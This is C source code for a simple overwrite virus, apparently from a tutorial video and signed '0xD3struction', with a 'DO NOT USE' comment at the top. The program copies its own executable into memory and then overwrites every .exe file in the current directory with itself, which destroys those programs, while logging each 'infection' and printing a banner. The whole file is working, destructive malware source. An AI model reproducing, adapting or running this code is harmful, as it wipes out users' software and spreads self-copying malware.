/*
     C OVERWRITE VIRUS 
     (only in local directory (*.EXE and *.exe) )
     FROM VIDEO:
	   https://www.youtube.com/watch?v=iOhAJDU4xOk

     DO NOT USE THIS CODE !

     0xD3struction

     2o23

*/

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>

char * GLOBAL_VIRUS_BUFFER;
long   VIRUS_SIZE = 0;

unsigned short SelfRead(char * ThisFile)
{
	FILE * Virus = 0;
	size_t BytesReaded = 0;
	
	
	if(!(Virus = fopen(ThisFile,"rb")))
	{
	  printf("[-] Fopen(%s) FAIL!\n",ThisFile);
	  return 0;
	}
	
	printf("[+] fopen SUCCESS !\n");	
		
	if(fseek(Virus,0,SEEK_END)!=0)
	{
	  printf("[-] fseek FAIL!\n");
	  return 0;
	}
	
	printf("[+] fseek SUCCESS !\n");
	
	if((VIRUS_SIZE=ftell(Virus))==-1)
	{
	  printf("[-] ftell FAIL!\n");
	  return 0;
	}
	
	printf("[+] ftell SUCCESS !\n");
	printf("[+] VIRUS SIZE %d\n",VIRUS_SIZE);
	
	rewind(Virus);
	
	if(!(GLOBAL_VIRUS_BUFFER = calloc(VIRUS_SIZE,1)))
	{
		printf("[-] Memory alocate FAIL !\n");
		fclose(Virus);
	 	return 0;
	}
	
	printf("[+] Memory Alocate SUCCESS !\n");
	
	 
	if(VIRUS_SIZE!=(BytesReaded=fread(GLOBAL_VIRUS_BUFFER,1,VIRUS_SIZE,Virus)))
	 {
	 	fclose(Virus);
	 	printf("[-] VIRUS SIZE != BYTES READED \n");
	 	return 0;
	 }
	 
	printf("[+] VIRUS READED !\n\n");
	
	fclose(Virus);
	return 1;
}

int main(int argc, char * argv[])
{
	printf("\t\t\t[0xD3struction] Debug C Virus Example\n\n");
	printf("VIRUS PATH :\n\t%s\n\n",argv[0]);
	if(!SelfRead(argv[0]))
	  return 0;
	
	printf("VIR[0] = '%c' \n",GLOBAL_VIRUS_BUFFER[0]);
    printf("VIR[1] = '%c' \n",GLOBAL_VIRUS_BUFFER[1]);
	
	int i;
	DIR * ThisDirectory;
	char * FileName;
	FILE * Infection = 0;
	struct dirent * FileInfo;
	unsigned short FileNameSize;
	
	if(!(ThisDirectory=opendir(".")))
		return 0;
	
	
	while((FileInfo=readdir(ThisDirectory)))
	{
		FileName=FileInfo->d_name;
		FileNameSize = strlen(FileName); 
		
		if(FileNameSize>2)
		{
		   if(FileName[FileNameSize-3]=='e' || FileName[FileNameSize-3]=='E')
		   	if(FileName[FileNameSize-2]=='x' || FileName[FileNameSize-2]=='X')
		   	 if(FileName[FileNameSize-1]=='e' || FileName[FileNameSize-1]=='E')
		   	 {
		   	 	printf("\n[+] %s \n",FileName);
		   	 	
		   	 	if(!(Infection=fopen(FileName,"w+b")))
		   	 	{
		   	 		printf("\t[-] fopen FAIL !\n");
		   	 		fclose(Infection);
		   	 		continue;
		   	 	}
		   	 	
		   	 	printf("\t[+] fopen  SUCCESS !\n");
						
		   	 	if(!fwrite(GLOBAL_VIRUS_BUFFER,1,VIRUS_SIZE,Infection))
		   	 	{
		   	 		printf("\t[-] fwrite FAIL !\n");
		   	 		fclose(Infection);
		   	 		continue;
		   	 	}
		   	 	printf("\t[+] FILE [%s] INFECTED !\n\n",FileName);
		   	 	fclose(Infection);
		   	 	continue;
		  	 }
		  	printf("[-] %s \n",FileName);
		}

	}
	closedir(ThisDirectory);
	free(GLOBAL_VIRUS_BUFFER);

    printf("     000000000                         DDDDDDDDDDDDD       333333333333333   \n"\
		   "   00:::::::::00                       D::::::::::::DDD   3:::::::::::::::33 \n"\
		   " 00:::::::::::::00                     D:::::::::::::::DD 3::::::33333::::::3\n"\
		   "0:::::::000:::::::0                    DDD:::::DDDDD:::::D3333333     3:::::3\n"\
		   "0::::::0   0::::::0xxxxxxx      xxxxxxx  D:::::D    D:::::D           3:::::3\n"\
		   "0:::::0     0:::::0 x:::::x    x:::::x   D:::::D     D:::::D          3:::::3\n"\
		   "0:::::0     0:::::0  x:::::x  x:::::x    D:::::D     D:::::D  33333333:::::3 \n"\
		   "0:::::0 000 0:::::0   x:::::xx:::::x     D:::::D     D:::::D  3:::::::::::3  \n"\
		   "0:::::0 000 0:::::0    x::::::::::x      D:::::D     D:::::D  33333333:::::3 \n"\
		   "0:::::0     0:::::0     x::::::::x       D:::::D     D:::::D          3:::::3\n"\
		   "0:::::0     0:::::0     x::::::::x       D:::::D     D:::::D          3:::::3\n"\
		   "0::::::0   0::::::0    x::::::::::x      D:::::D    D:::::D           3:::::3\n"\
		   "0:::::::000:::::::0   x:::::xx:::::x   DDD:::::DDDDD:::::D3333333     3:::::3\n"\
		   " 00:::::::::::::00   x:::::x  x:::::x  D:::::::::::::::DD 3::::::33333::::::3\n"\
		   "   00:::::::::00    x:::::x    x:::::x D::::::::::::DDD   3:::::::::::::::33 \n"\
		   "     000000000     xxxxxxx      xxxxxxxDDDDDDDDDDDDD       333333333333333   \n");
	system("pause");
}
